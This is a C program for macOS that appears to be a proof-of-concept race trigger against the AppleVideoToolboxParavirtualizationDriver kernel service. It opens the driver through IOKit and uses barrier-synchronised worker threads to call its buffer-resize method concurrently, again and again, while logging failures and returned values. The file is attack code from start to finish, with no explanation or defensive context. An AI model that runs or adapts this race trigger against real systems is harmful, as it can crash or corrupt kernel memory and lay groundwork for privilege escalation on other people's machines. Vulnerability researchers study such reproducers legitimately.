#include <CoreFoundation/CoreFoundation.h>
#include <IOKit/IOKitLib.h>
#include <mach/mach.h>
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

static const char *kServiceName =
    "AppleVideoToolboxParavirtualizationDriver";

struct barrier {
    pthread_mutex_t lock;
    pthread_cond_t condition;
    unsigned target;
    unsigned waiting;
    unsigned generation;
};

struct shared_state {
    io_connect_t connection;
    struct barrier start;
    struct barrier done;
    uint64_t target_size;
    int stop;
};

struct worker {
    struct shared_state *shared;
    kern_return_t result;
    uint32_t output_count;
    uint64_t output[3];
};

static int barrier_init(struct barrier *barrier, unsigned target) {
    memset(barrier, 0, sizeof(*barrier));
    barrier->target = target;
    if (pthread_mutex_init(&barrier->lock, NULL) != 0) {
        return -1;
    }
    if (pthread_cond_init(&barrier->condition, NULL) != 0) {
        pthread_mutex_destroy(&barrier->lock);
        return -1;
    }
    return 0;
}

static void barrier_wait(struct barrier *barrier) {
    pthread_mutex_lock(&barrier->lock);
    unsigned generation = barrier->generation;
    barrier->waiting++;
    if (barrier->waiting == barrier->target) {
        barrier->waiting = 0;
        barrier->generation++;
        pthread_cond_broadcast(&barrier->condition);
    } else {
        while (generation == barrier->generation) {
            pthread_cond_wait(&barrier->condition, &barrier->lock);
        }
    }
    pthread_mutex_unlock(&barrier->lock);
}

static void barrier_destroy(struct barrier *barrier) {
    pthread_cond_destroy(&barrier->condition);
    pthread_mutex_destroy(&barrier->lock);
}

static kern_return_t resize_buffer(io_connect_t connection, uint64_t size,
                                   uint64_t output[3],
                                   uint32_t *output_count) {
    uint64_t input = size;
    *output_count = 3;
    return IOConnectCallScalarMethod(connection, 0, &input, 1, output,
                                     output_count);
}

static void *race_worker(void *opaque) {
    struct worker *worker = opaque;
    struct shared_state *shared = worker->shared;

    pthread_set_qos_class_self_np(QOS_CLASS_USER_INTERACTIVE, 0);

    for (;;) {
        barrier_wait(&shared->start);
        if (shared->stop) {
            barrier_wait(&shared->done);
            break;
        }

        memset(worker->output, 0, sizeof(worker->output));
        worker->result =
            resize_buffer(shared->connection, shared->target_size,
                          worker->output, &worker->output_count);
        barrier_wait(&shared->done);
    }
    return NULL;
}

static io_service_t find_service(void) {
    CFMutableDictionaryRef matching = IOServiceMatching(kServiceName);
    if (matching == NULL) {
        return IO_OBJECT_NULL;
    }
    return IOServiceGetMatchingService(kIOMainPortDefault, matching);
}

int main(int argc, char **argv) {
    unsigned cycles = 4;
    unsigned thread_count = 4;
    uint64_t step = 0x4000;
    uint64_t max_size = 0xa00000;
    const uint64_t baseline_size = 0x1000;

    if (argc > 1) {
        cycles = (unsigned)strtoul(argv[1], NULL, 0);
    }
    if (argc > 2) {
        thread_count = (unsigned)strtoul(argv[2], NULL, 0);
    }
    if (argc > 3) {
        step = strtoull(argv[3], NULL, 0);
    }
    if (argc > 4) {
        max_size = strtoull(argv[4], NULL, 0);
    }
    if (cycles == 0 || cycles > 64 || thread_count < 2 ||
        thread_count > 64 || step == 0 || step > max_size ||
        max_size <= baseline_size || max_size > 0xa00000) {
        fprintf(stderr, "invalid arguments\n");
        return 2;
    }

    io_service_t service = find_service();
    if (service == IO_OBJECT_NULL) {
        fprintf(stderr, "service not found: %s\n", kServiceName);
        return 1;
    }

    struct worker *workers = calloc(thread_count, sizeof(*workers));
    pthread_t *threads = calloc(thread_count, sizeof(*threads));
    if (workers == NULL || threads == NULL) {
        fprintf(stderr, "allocation failed\n");
        IOObjectRelease(service);
        return 1;
    }

    printf("uid=%u cycles=%u threads=%u step=0x%llx max=0x%llx\n",
           getuid(), cycles, thread_count, step, max_size);
    fflush(stdout);

    for (unsigned cycle = 0; cycle < cycles; cycle++) {
        io_connect_t connection = IO_OBJECT_NULL;
        kern_return_t kr =
            IOServiceOpen(service, mach_task_self(), 0, &connection);
        if (kr != KERN_SUCCESS) {
            fprintf(stderr, "cycle=%u IOServiceOpen=0x%x\n", cycle, kr);
            break;
        }

        uint64_t baseline_output[3] = {0};
        uint32_t baseline_output_count = 3;
        kr = resize_buffer(connection, baseline_size, baseline_output,
                           &baseline_output_count);
        if (kr != KERN_SUCCESS || baseline_output_count != 3) {
            fprintf(stderr,
                    "cycle=%u baseline=0x%x output_count=%u\n",
                    cycle, kr, baseline_output_count);
            IOServiceClose(connection);
            break;
        }

        struct shared_state shared;
        memset(&shared, 0, sizeof(shared));
        shared.connection = connection;
        if (barrier_init(&shared.start, thread_count + 1) != 0 ||
            barrier_init(&shared.done, thread_count + 1) != 0) {
            fprintf(stderr, "cycle=%u barrier_init failed\n", cycle);
            IOServiceClose(connection);
            break;
        }

        for (unsigned i = 0; i < thread_count; i++) {
            workers[i].shared = &shared;
            if (pthread_create(&threads[i], NULL, race_worker, &workers[i]) !=
                0) {
                fprintf(stderr, "pthread_create failed at worker %u\n", i);
                _exit(3);
            }
        }

        unsigned wave = 0;
        for (uint64_t target = baseline_size + step;
             target <= max_size; target += step) {
            shared.target_size = target;
            barrier_wait(&shared.start);
            barrier_wait(&shared.done);

            unsigned failures = 0;
            for (unsigned i = 0; i < thread_count; i++) {
                if (workers[i].result != KERN_SUCCESS ||
                    workers[i].output_count != 3) {
                    failures++;
                }
            }

            if ((wave & 0x3f) == 0 || failures != 0) {
                printf("cycle=%u wave=%u target=0x%llx failures=%u "
                       "first=0x%x out0=0x%llx out1=0x%llx\n",
                       cycle, wave, target, failures, workers[0].result,
                       workers[0].output[0], workers[0].output[1]);
                fflush(stdout);
            }
            wave++;

            if (UINT64_MAX - target < step) {
                break;
            }
        }

        shared.stop = 1;
        barrier_wait(&shared.start);
        barrier_wait(&shared.done);
        for (unsigned i = 0; i < thread_count; i++) {
            pthread_join(threads[i], NULL);
        }
        barrier_destroy(&shared.done);
        barrier_destroy(&shared.start);
        IOServiceClose(connection);

        printf("cycle=%u complete\n", cycle);
        fflush(stdout);
    }

    free(threads);
    free(workers);
    IOObjectRelease(service);
    return 0;
}
